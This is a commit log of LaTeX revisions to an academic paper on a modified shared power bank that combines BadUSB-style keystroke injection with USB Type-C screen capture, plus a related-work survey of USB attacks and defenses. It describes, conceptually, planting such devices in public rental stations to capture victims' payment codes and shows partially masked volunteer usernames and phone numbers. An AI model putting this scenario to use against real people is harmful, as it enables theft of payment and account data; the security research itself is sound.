+Mohammadmoradi et al\cite{mohammadmoradi2018making} propose a strategy to generate a whitelist automatically.
+Based on the features and functions of the USB devices, Mohammadmoradi et al generate unique fingerprint to each device and classify them.
 There are also some work like TMSUI\cite{yang2015tmsui}, which is based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
-
-Since USB devices may hide their real functionality from the user.
-GoodUSB\cite{tian2015defending} will report the functionality and identity of the device to the user and the user needs to explicitly authorize.
+However, this work relies on the information provided by the device during enumeration. Some USB devices may hide their real functionality from the user.
+GoodUSB\cite{tian2015defending} will report the functionality and identity of the device to user and user needs to explicitly authorize.
 On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
@@
 For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-Because from the user's perspective, he must permit a USB-based keyboard the corresponding drivers to allow himself to authorize, but once the drivers are loaded, the malicious USB-based keyboard can also automatically type in commands.
+Because from the user's perspective, he/she must permit a USB-based keyboard the corresponding drivers by authorizing them him/herself.
+But once the drivers are loaded, the malicious USB-based keyboard can also automatically type in commands.
+
+When the USB device is normally enumerated and can interact with the host, there are also some defenses. 
+Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyzing temporal characteristics of BadUSB-like attacks.
+This defense mechanism is effective as the attacker cannot obtain the screen of the host using BadUSB.
+In this case, the malicious device can only inject instructions in a very short time to reduce the risk of being discovered.
+It leads to the typing characteristics of BadUSB devices to be abnormal and detectable.
+Apart from key injection attacks, malicious file injection can also be detected.
+Pham et al.
+\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code from attacking host.
 What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of code.
+In addition to injection attacks, data theft attack is also one of the focuses of the academic community.
+When the screen data of the mobile device is stolen while charging, the power consumption of the mobile device will change.
+So Meng et al\cite{meng2018252} detect potential attacks by monitoring and analyzing changes in the usage of CPU and GPU.
 
-Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only if one USB device is in the white list can it interact with host.
-This prevents all interactions between untrusted devices and the host.
-But this reduces the easy-to-use property and requires users to have a certain safety awareness.
-For example, a naive user may add the USB device he/she found outdoors to his/her whitelist without precautions.
-Mohammadmoradi et al\cite{mohammadmoradi2018making} propose generating unique fingerprint based on the features and functions of the USB device to build such a whitelist.
+Some composite anti-virus systems, like Metascan\cite{OPSWAT}, incorporates some defenses.
+Metascan can verify digital signature of USB device, sanitize the malicious files in the device to stop malware, and deploy kiosks to protect security-sensitive organizations.
+However, Metascan also warned users to be cautious of the device plugged into the host, since there is no way to ensure absolute security.
 
-Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyzing temporal characteristics of BadUSB-like attacks.
-This defense mechanism is successful as the attacker cannot obtain the screen of the host using BadUSB, so that the malicious device can only inject instructions in a very short time to prevent the user from discovering.
-This causes the typing characteristics of BadUSB devices to be abnormal and detectable.
+\linyou{logic connection and pros/cons}
 
-Some composite anti-virus systems, like Windows Defender ATP\cite{windenfender} and Metascan\cite{OPSWAT} can sanitize the malicious files in the device to stop malware.
-However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.
-
-For those attacks that use the USB cable to peek at the device screen while the user is charging the mobile device, Meng et al\cite{meng2018252} detect potential attacks by analyzing changes in the usage of CPU and GPU.
-
-We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrated the effectiveness of each defense against various attacks including our \tool.
+We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of each defense against various attacks including our \tool.
 \begin{table*}

### 2021-01-21 WOOT/Files/experiment.tex
Power bank
Minor
Figures
[experiment] figure & case

@@
 
+\subsubsection{Background}
+
 We conduct a case study with Power bank sharing and QR code payment as technical background.
 
-\subsubsection{Power bank sharing}
-
+\textbf{\textit{Power Bank Sharing}}. 
 Power bank sharing provides users with short term rental of power banks.
@@
 	\includegraphics[width=.4 \linewidth]{./Figs/jiedian.jpg}
-	\caption{Two power banks station products}
+	\caption{Two power banks station products}\shuqing{Our attacking power banks.}
 	\label{fig:PBS_products}
@@
 
-\subsubsection{QR code payment}
-
+\textbf{\textit{QR Code Payment}}. 
 QR code payment is a payment method where payment is typically performed as the following steps:
@@
 Noticed the low users' vigilance and high similarity between \tool and normal power bank, the attacker can return his/her modified power bank (as \tool) to a power bank station, mixing \tool into the circulation of shared power banks.
-The next user unconsciously connect his/her device to \tool.
-He/She can find his/her devices being charged as normal.
+The next user who unconsciously connect his/her device to \tool can find his/her devices being charged as normal.
 Like many outdoor mobile phone usage scenarios, the victim may complete payment with showing payment code.
@@
 
-\subsection{User study}
-
 In order to check what can be obtained by \tool, we conduct a user study in order to check the performance of \tool in Privacy extraction mode.
-
-\subsubsection{Setup}
-
-\subsubsection{Scenario}
-
 We invited 6 volunteers to our lab room.
@@
 Such keywords are more likely to lead us to discover user-specific data.
-For example, in Figure~\ref{fig:ocr_keyword_example}, searching with ``account'' as the keyword, victim's accounts can be detected as shown in Fig.
+For example, in Table~\ref{tab:ocr_keyword_example}, searching with ``account'' as the keyword, victim's accounts can be detected as shown in Fig.
 The frame number is the position of this frame in the recorded video, which indicates a target for manual analysis for further data extraction.
 
-\begin{figure}[hbtp]
+\begin{table*}[hbtp]
 	\centering
-	\includegraphics[width=\linewidth]{./Figs/ocr_keyword_example.png}
-	\caption{Search ``account'' in all OCR results}
-	\label{fig:ocr_keyword_example}
-\end{figure}
+	\begin{tabular}{|l|l|l|l|}
+		\hline
+		Keyword  & Text                                                                                                                          & Name                           & Frame Number \\ \hline
+		username & X 8B cas.******.edu.cn Username: 117***18 Password:                                                                           & \textless{}user1\textgreater{} & 385          \\ \hline
+		username & Login Weibo Login with SMS and verification code ...... +86 151****4587 Get verification code Login with username \& password & \textless{}user5\textgreater{} & 1947         \\ \hline
+		username & QQ 14*****50| Login with phone number New user registration 2345678 9 0                                                       & \textless{}user3\textgreater{} & 4308         \\ \hline
+		username & connect to *** username h*****l Save account information Open VPN.....                                                        & \textless{}user6\textgreater{} & 7925         \\ \hline
+		+86      & Login with phone number ...... +86 186****2483 |                                                                              & \textless{}user1\textgreater{} & 313          \\ \hline
+	\end{tabular}
+	\caption{Example of searching OCR results with some keywords}
+	\label{tab:ocr_keyword_example}
+\end{table*}
 
@@
 	\linebreak
-	\caption{Information extracted}
+	\caption{Information extracted}\shuqing{Compress.}
 	\label{table:information_extracted}

### 2021-01-22 WOOT/Files/related_work.tex
revision of defense related work

@@
 \label{subsec:usb_attack}
+\chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
 While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
@@
 There are already many defenses proposed against BadUSB attacks and a comprehensive investigation of previous work.\cite{sok}.
-BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10}.
+
+From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which are defined by protocol to transmitting data.
 Without these pins, data can't be transferred via USB cable.
-USB Condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the USB device and host.
-This hardware can cut off the `D-' and `D+' and allow only power pins.
-However, this method poses a great challenge to easy-to-use property, and once deployed, it will block all USB functions other than charging.
+Based on this fact, USB Condom \cite{Condom} is a hardware solution to block data channel by adding blocker in the connector.
+This blocker can cut off the `D-' and `D+' connection while leave power pins intact.
+However, this method poses a great challenge to plug-and-play property of USB, as once it is deployed, it will stop all USB functions other than charging.
 
-Under the premise of ensuring the normal operation of all USB pins, some work improve the security of connection establishment.
-Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host through data channel.
-This prevents all interactions between untrusted devices and the host.
-But this requires users to have a certain safety awareness.
+Under the premise of ensuring the full functionality of USB devices, there have been some works trying to improve the security during connection establishment.
+Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices on the whitelist are allowed to communicate with the host.
+This prevents all potential attacks from untrusted devices.
+But this requires users to have a certain safety awareness and technical background to maintain a valid whitelist.
 For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
-Mohammadmoradi et al\cite{mohammadmoradi2018making} propose a strategy to generate a whitelist automatically.
-Based on the features and functions of the USB devices, Mohammadmoradi et al generate unique fingerprint to each device and classify them.
-There are also some work like TMSUI\cite{yang2015tmsui}, which is based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
-However, this work relies on the information provided by the device during enumeration. Some USB devices may hide their real functionality from the user.
-GoodUSB\cite{tian2015defending} will report the functionality and identity of the device to user and user needs to explicitly authorize.
-On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
-This restricts the device to load only the drivers allowed by the user, but does not prevent the device from using available drivers to attack.
-For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-Because from the user's perspective, he/she must permit a USB-based keyboard the corresponding drivers by authorizing them him/herself.
-But once the drivers are loaded, the malicious USB-based keyboard can also automatically type in commands.
+In order to overcome this drawback, Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
+This strategy first generates a unique fingerprint for each device based on its functionality.
+Then these fingerprints are used to maintain a safe and valid whitelist of USB devices.
+Apart from whitelist approach, there are also works like TMSUI\cite{yang2015tmsui}, which identifies the unreliable information provided by USB devices and thus defend against BadUSB attack.
+However, this work relies on the information provided by the device during enumeration.
+Some modified USB devices may hide their real functionality from the host.
 
-When the USB device is normally enumerated and can interact with the host, there are also some defenses. 
-Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyzing temporal characteristics of BadUSB-like attacks.
-This defense mechanism is effective as the attacker cannot obtain the screen of the host using BadUSB.
-In this case, the malicious device can only inject instructions in a very short time to reduce the risk of being discovered.
-It leads to the typing characteristics of BadUSB devices to be abnormal and detectable.
-Apart from key injection attacks, malicious file injection can also be detected.
+To solve this flaw, GoodUSB\cite{tian2015defending} will report the functionality claimed by the device to user and let user decides whether to authorize.
+When a device is plugged in, GoodUSB will load its driver but limit its functionality until a series of authorizations is completed.
+These authorizations are designed to be performed manually.
+As BadUSB is normally unable to obtain the video stream of the host, it is impossible for an attacker to complete these authorization with automatic script.
+Thus this defense is sufficient for normal BadUSB attack.
+But if the attacker has the access to victim's screen, GoodUSB will be bypassed easily as the attacker can just complete these authorization manually and perform subsequent attacks.
+
+After the USB enumeration and driver loading, there are also works trying to archive `defense in depth' against BadUSB attack.
+Neuner et al.\cite{neuner2018usblock} prevents BadUSB attacks from malicious flash drive by analyzing the temporal characteristics of BadUSB-like attacks.
+This defense mechanism is effective because the attacker cannot obtain the screen of the host using just BadUSB.
+In this case, the malicious device can only inject key stoke in a very short time to reduce the risk of being discovered.
+This defect causes the typing characteristics of BadUSB to be detectable.
 Pham et al.
-\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code from attacking host.
-What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of code.
-In addition to injection attacks, data theft attack is also one of the focuses of the academic community.
-When the screen data of the mobile device is stolen while charging, the power consumption of the mobile device will change.
-So Meng et al\cite{meng2018252} detect potential attacks by monitoring and analyzing changes in the usage of CPU and GPU.
+\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices,\hongyi{What?} and can prevent malicious code from attacking host.
+What's more, in GoodUSB, a VM is deployed in host to as a honeypot to detect and stop malicious behavior of USB devices.
 
-Some composite anti-virus systems, like Metascan\cite{OPSWAT}, incorporates some defenses.
-Metascan can verify digital signature of USB device, sanitize the malicious files in the device to stop malware, and deploy kiosks to protect security-sensitive organizations.
-However, Metascan also warned users to be cautious of the device plugged into the host, since there is no way to ensure absolute security.
+In addition to injection attacks, data theft attack is also one of the focuses of academic community.
+As mentioned in Section~\ref{subsec:usb_attack}, there exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
+In order to mitigate this issue, Meng et al proposed a statistical model using status like GPU/CPU usage to detect JFC attack\cite{meng2018252}.
 
-\linyou{logic connection and pros/cons}
+To summarize, there exists a clear trade-off between the effectiveness and the plug-and-play property.
+Though hardware disabling solution like USB Condom archives the almost absolute security, the functionality of USB is scarified.
+Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
+There are many challenges to overcome before an optimal defense is formulated.\hongyi{Are there better way to express this?}
 

### 2021-01-22 ocr/xd.sh
[ocr] scripts

@@ -1,0 +1,3 @@
+mkdir lsq
+ffmpeg -i lsq.mkv -r 5 lsq/%05d.jpeg
+

### 2021-01-23 WOOT/Files/related_work.tex
Update related_work.tex

--- 2021-01-21 WOOT/Files/related_work.tex
@@
 \label{sec:related_work}
-\hongyi{Move the stuff about USB protocol to Background}\\
-\outline{Attack based on USB 1.0, briefly}\\
-\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
-\outline{Attack survey table}\\
-\outline{Attack or current works about USB Type-C}\\
 
@@
 While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
-In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.\hongyi{What?} One way is to masquerade protocol of attack devices, e.g., Rubbery Ducky \cite{rubber},\cite{badusb}, \cite{rubberducky2020}, \cite{usbbypassing}, \cite{iseeyou}and USBderivery\cite{usbdriver}, when they are connected to the host, they will hide their own functionality with the re-written firmware, that works because of HID enumeration does not verify the firmware of devices.
-Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modifying the USB table as an additional RF transmitter.
-What is more, the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technique.
-These attacks are all using the vulnerabilities of USB protocol, but due to the limitations of USB 2.0, there are no port for video transferring in the devices with USB 2.0, so it is impossible to obtain the real-time screen information of the host, only environment fitted commands and scripts will work in these scenarios.
+In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, accurate attacks couldn't be performed due to lack of user interface (UI).
+One means of attack is to crash the operating system with the property that the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technique.
+But code injection and data exfiltrating would not work here.
 
-In a similar way, \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host, \cite{brain}, \cite{stuxnet}, \cite{conficker} and \cite{flame} also attack with code injection.
-\cite{webcam}, \cite{malware},\cite{audioextraction}, \cite{usbee}, and \cite{turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
+\textbf{Attacks based on code injection and data exfiltrating: } \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host, \cite{brain, stuxnet, conficker,flame} also attack with code injection.
+\cite{webcam, malware, audioextraction, usbee, turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
 Due to the limitation of functionality interface of devices in video transmitting, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pausing the execution in the inappropriate time.
 
-Another kind of attacks for USB \cite{JFC} is to automatically record phone-screen and monitor user's input based on  the Mobile High-Definition Link(MHL) standard.
+\textbf{Attacks based on protocol masquerading:} Protocol masquerading is widely used to hide their own functionality with the re-written firmware, that works because of HID enumeration does not verify the firmware of devices \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
+These works try to hide their own functionality with the re-written firmware when they are connected to the host, software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modifying the USB table as an additional RF transmitter.
+Due to the limitations of USB 2.0, there is no port for video transferring in the devices with USB 2.0, accurate attacks could not be performed without real-time feedback from the host, only environment fitted commands and scripts will work in these scenarios.
+\cite{JFC} is to automatically record phone-screen and monitor user's input based on the Mobile High-Definition Link(MHL) standard.
 With this approach, it is able to successfully exfiltrate data without the permission on user's side.
 Due to the limitation of MHL standard, only data exfiltrating works here, an additional conversion tool is necessary.
-Other attacks for USB to exfiltrate data\cite{smartphone}, \cite{poweremi},\cite{revealing}, \cite{su2017usb}, \cite{usbgpslocator}, \cite{bates2014leveraging}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} are to eavesdrop signals to recover the sensitive data at the physical layer.
-In a similar way, \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+
+\textbf{Attacks based on physical signal recovering:} Physical radio frequency always contains sensitive data, \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} are to eavesdrop signals to recover the sensitive data at the physical layer.
+In a similar way, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
 Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.

### 2021-01-23 WOOT/Files/related_work.tex
revision of attack related work

@@
 \chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
-While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
-In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, accurate attacks couldn't be performed due to lack of user interface (UI).
-One means of attack is to crash the operating system with the property that the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technique.
-But code injection and data exfiltrating would not work here.
+During the development of USB protocol, there are many USB-based attacks were proposed, ranging from DoS (denial of service) to protocol masquerading.
+Here we will introduce them following an order of their category.
 
-\textbf{Attacks based on code injection and data exfiltrating: } \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host, \cite{brain, stuxnet, conficker,flame} also attack with code injection.
-\cite{webcam, malware, audioextraction, usbee, turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
-Due to the limitation of functionality interface of devices in video transmitting, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pausing the execution in the inappropriate time.
+From the kernel perspective, its USB software stack generally expects devices to follow the USB standard and may not consider corner cases of malformed USB packets.
+Based on this, Facedancer\cite{facedancer} and Syzkaller\cite{syzkaller} uses fuzzing technique to uncover the bugs lying in the kernel drivers.
+These bugs can cause kernel crash and lead to a DoS situation.
+Though this poses a great challenge to the availability of a system, this attack still requires physical access to the host and is unable to cause more damage other than DoS.
 
-\textbf{Attacks based on protocol masquerading:} Protocol masquerading is widely used to hide their own functionality with the re-written firmware, that works because of HID enumeration does not verify the firmware of devices \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
-These works try to hide their own functionality with the re-written firmware when they are connected to the host, software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modifying the USB table as an additional RF transmitter.
-Due to the limitations of USB 2.0, there is no port for video transferring in the devices with USB 2.0, accurate attacks could not be performed without real-time feedback from the host, only environment fitted commands and scripts will work in these scenarios.
-\cite{JFC} is to automatically record phone-screen and monitor user's input based on the Mobile High-Definition Link(MHL) standard.
-With this approach, it is able to successfully exfiltrate data without the permission on user's side.
-Due to the limitation of MHL standard, only data exfiltrating works here, an additional conversion tool is necessary.
+In the field of USB security, protocol masquerading is also a widely used attack scheme.
+Due to the lack of authentication in USB protocol, malicious devices can hide their real functionality with re-written firmware\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
+These works rewrite the firmware of a normal-looking flash drive, which allows it to pretend as other devices.
+When these modified drives are connected to the host, they will be recognized as keyboard or mouse.
+Then the attacker can execute malicious payloads as they were using the victim's devices.
+But due to the limitation of USB 2.0\cite{usb20} protocol, these BadUSB attacks are unable to obtain video feedback from the victim as video were not supported until USB 3.0 \cite{usb30}.
+Though USB 2.0 does not support video transmission, there exists a protocol called MHL(Mobile High-Definition Link) which extends the USB standard and allow video signal to be transmitted through USB interface.
+JFC\cite{JFC}, short for juicy filming charging is such a work which abuses this standard and exfiltrate video data from victim without permission.
+But in JFC, this data exfiltration is not combined with BadUSB attacks and MHL is an outdated standard, which limits its capability.
 
-\textbf{Attacks based on physical signal recovering:} Physical radio frequency always contains sensitive data, \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} are to eavesdrop signals to recover the sensitive data at the physical layer.
-In a similar way, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+Besides attacking from the protocol perspective, there are works trying to use USB device as a payload delivery means.
+Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device and uses a zero-day exploit\cite{zero-day} to execute the malware automatically.
+There are also works like \cite{brain, stuxnet, conficker,flame} following the same paradigm and performing code-injection attacks.
+These attacks are much more damaging and flexible comparing to those previous ones, but they requires certain existing flaw like \cite{zero-day} and USB are merely a payload delivery method.
+
+As a data transmission protocol, USB inevitably leaks electromagnetic signals to the environment which may contains sensitive information.
+Leveraging this physical phenomenon, there are works like \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} eavesdropping leaked signals and recovering the sensitive data.
+In a similar fashion, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
 Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.

### 2021-01-23 WOOT/Files/related_work.tex
resolve the problem of table in related work

@@
 		\hline
-		\diagbox {Defence}{Attack} & Rubbery Ducky\cite{rubber}, \cite{rubberducky2020},USBderivery\cite{usbdriver} & Duqu\cite{duqu} & JFC\cite{JFCImpact}&\cite{smartphone}\cite{poweremi} and \cite{usbdriver}& Armory\\
+		\diagbox[width=1.46in] {Defence}{Attack} & Rubbery Ducky\cite{rubber}, \cite{rubberducky2020},USBderivery\cite{usbdriver} & Duqu\cite{duqu} & JFC\cite{JFCImpact}&\cite{smartphone}\cite{poweremi} and \cite{usbdriver}& Armory\\
 

### 2021-01-23 WOOT/Files/related_work.tex
minor change of related work

@@
 During the development of USB protocol, there are many USB-based attacks were proposed, ranging from DoS (denial of service) to protocol masquerading.
-Here we will introduce them following an order of their category.
+Here we will introduce them following an order of their category.\hongyi{What?}
 
@@
 
-Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transformation for video streaming data is guaranteed with the other attacks, e.g., protocol masquerading,  protocol corruption and code injection.
-This allows attacker to control users' devices with screen monitoring, attacks for interaction work here.
+Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transferring of video data can be combined with the other attacks, like protocol masquerading,  protocol corruption and code injection.
+This has paved the path for our \tool.
 

### 2021-01-23 WOOT/Files/related_work.tex
update related_word

--- 2021-01-23 WOOT/Files/related_work.tex
@@
 \chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
-During the development of USB protocol, there are many USB-based attacks were proposed, ranging from DoS (denial of service) to protocol masquerading.
-Here we will introduce them following an order of their category.
+While many USB based attacks have been proposed, these attacks are all tied to the environment of the target devices.
+In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transferring interface, accurate attacks couldn't be performed due to lack of user interface (UI).
+One means of attack is to crash the operating system with the property that the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technique.
+But code injection and data exfiltrating would not work here.
 
-From the kernel perspective, its USB software stack generally expects devices to follow the USB standard and may not consider corner cases of malformed USB packets.
-Based on this, Facedancer\cite{facedancer} and Syzkaller\cite{syzkaller} uses fuzzing technique to uncover the bugs lying in the kernel drivers.
-These bugs can cause kernel crash and lead to a DoS situation.
-Though this poses a great challenge to the availability of a system, this attack still requires physical access to the host and is unable to cause more damage other than DoS.
+\textbf{Attacks based on code injection and data exfiltrating: } \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host, \cite{brain, stuxnet, conficker,flame} also attack with code injection.
+\cite{webcam, malware, audioextraction, usbee, turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
+Due to the limitation of functionality interface of devices in video transmitting, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pausing the execution in the inappropriate time.
 
-In the field of USB security, protocol masquerading is also a widely used attack scheme.
-Due to the lack of authentication in USB protocol, malicious devices can hide their real functionality with re-written firmware\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
-These works rewrite the firmware of a normal-looking flash drive, which allows it to pretend as other devices.
-When these modified drives are connected to the host, they will be recognized as keyboard or mouse.
-Then the attacker can execute malicious payloads as they were using the victim's devices.
-But due to the limitation of USB 2.0\cite{usb20} protocol, these BadUSB attacks are unable to obtain video feedback from the victim as video were not supported until USB 3.0 \cite{usb30}.
-Though USB 2.0 does not support video transmission, there exists a protocol called MHL(Mobile High-Definition Link) which extends the USB standard and allow video signal to be transmitted through USB interface.
-JFC\cite{JFC}, short for juicy filming charging is such a work which abuses this standard and exfiltrate video data from victim without permission.
-But in JFC, this data exfiltration is not combined with BadUSB attacks and MHL is an outdated standard, which limits its capability.
+\textbf{Attacks based on protocol masquerading:} Protocol masquerading is widely used to hide their own functionality with the re-written firmware, that works because of HID enumeration does not verify the firmware of devices \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
+These works try to hide their own functionality with the re-written firmware when they are connected to the host, software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modifying the USB table as an additional RF transmitter.
+Due to the limitations of USB 2.0, there is no port for video transferring in the devices with USB 2.0, accurate attacks could not be performed without real-time feedback from the host, only environment fitted commands and scripts will work in these scenarios.
+\cite{JFC} is to automatically record phone-screen and monitor user's input based on the Mobile High-Definition Link(MHL) standard.
+With this approach, it is able to successfully exfiltrate data without the permission on user's side.
+Due to the limitation of MHL standard, only data exfiltrating works here, an additional conversion tool is necessary.
 
-Besides attacking from the protocol perspective, there are works trying to use USB device as a payload delivery means.
-Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device and uses a zero-day exploit\cite{zero-day} to execute the malware automatically.
-There are also works like \cite{brain, stuxnet, conficker,flame} following the same paradigm and performing code-injection attacks.
-These attacks are much more damaging and flexible comparing to those previous ones, but they requires certain existing flaw like \cite{zero-day} and USB are merely a payload delivery method.
-
-As a data transmission protocol, USB inevitably leaks electromagnetic signals to the environment which may contains sensitive information.
-Leveraging this physical phenomenon, there are works like \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} eavesdropping leaked signals and recovering the sensitive data.
-In a similar fashion, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+\textbf{Attacks based on physical signal recovering:} Physical radio frequency always contains sensitive data, \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} are to eavesdrop signals to recover the sensitive data at the physical layer.
+In a similar way, \cite{usbkiller, cable, usbee, turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
 Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
@@
 For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
-In order to overcome this drawback, Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
+There is a design can overcome this drawback.
+Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
 This strategy first generates a unique fingerprint for each device based on its functionality.
 Then these fingerprints are used to maintain a safe and valid whitelist of USB devices.
-Apart from whitelist approach, there are also works like TMSUI\cite{yang2015tmsui}, which identifies the unreliable information provided by USB devices and thus defend against BadUSB attack.
-However, this work relies on the information provided by the device during enumeration.
-Some modified USB devices may hide their real functionality from the host.
+There is also work mediating USB connectivity for Industrial Control.
+TMSUI\cite{yang2015tmsui} relies on rich experience of administrator to build a whitelist.
+However, some modified USB devices may hide their real functionality from the user.
 
@@
 Pham et al.
-\cite{pham2010optimizing} and odix\cite{OLEA} propose scanning function for files on portable USB devices,\hongyi{What?} and can prevent malicious code from attacking host.
+\cite{pham2010optimizing} block unsigned files from being Executed and automatically checks the driver signing option.
 What's more, in GoodUSB, a VM is deployed in host to as a honeypot to detect and stop malicious behavior of USB devices.
@@
 Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
-There are many challenges to overcome before an optimal defense is formulated.\hongyi{Are there better way to express this?}
+Some vendors may sacrifice defensive capabilities to improve usability, which allows attackers to take advantage of.
 

### 2021-01-23 WOOT/Files/badusb.tex

@@
 We also assume the victim's device is equipped with fully functional USB 3.x protocol and USB Type C connector.
-As the USB 3.x standard is more and more common around the world, this assumption can be easily fulfilled especially in recent devices.
+As the USB 3.x standard is more and more common nowadays, this assumption can be easily fulfilled especially in recent devices.
 \subsection{Motivation}
@@
 As we introduced in the Section~\ref{sec:related_work}, there are plenty of existing work \shuqing{Add citation} focusing on BadUSB attack. 
